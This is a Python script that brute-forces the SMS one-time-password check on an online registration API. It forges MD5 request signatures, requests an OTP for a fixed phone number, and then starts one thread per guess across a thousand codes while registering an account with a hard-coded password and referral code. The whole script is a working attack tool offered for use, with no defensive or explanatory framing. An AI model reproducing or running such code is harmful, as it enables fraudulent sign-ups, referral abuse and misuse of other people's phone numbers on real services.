import threading 
import requests
from json import loads
from hashlib import md5
from time import time
import sys
def send(number):
	url="https://www.shopee-online.com/v1/api/player/sendOpt"
	u = int(time() * 1000) 
	p='{"playerName":"'+str(number)+'"}'
	g="1000001" + str(u) + str(p)
	sign=md5(g.encode())
	sign=sign.hexdigest()
	d='{"sign":"'+sign+'","timeStamp":'+str(u)+',"reqData":{"playerName":"'+str(number)+'"}}'
	res=requests.post(url=url,data=d)
	print(res.text)
def verify(number,otp):
	url="https://www.shopee-online.com/v1/api/player/register"
	u = int(time() * 1000) 
	p='{"appId":"1000001","passWord":"Test@1234","playerName":"'+str(number)+'","referralCode":"4gca23","repeatPassword":"Test@1234","verificationCode":"'+str(otp)+'"}'
	g="1000001" + str(u) + str(p)
	sign=md5(g.encode())
	sign=sign.hexdigest()
	d='{"sign":"'+sign+'","timeStamp":'+str(u)+',"reqData":'+p+'}'
	try:
		res=requests.post(url=url,data=d)
		print(res.text)
		j=loads(res.text)
		code=j['Code']
		if code==200:
			sys.exit()
	except:
		print("request error")

for x in range(9000,8000,-1):
  num=9876543210
  otp=x
  try:
  	p=threading.Thread(target=verify,args=(num,otp,))
  	p.start()
  	
  except:
  	print("Threadng Error Occued")
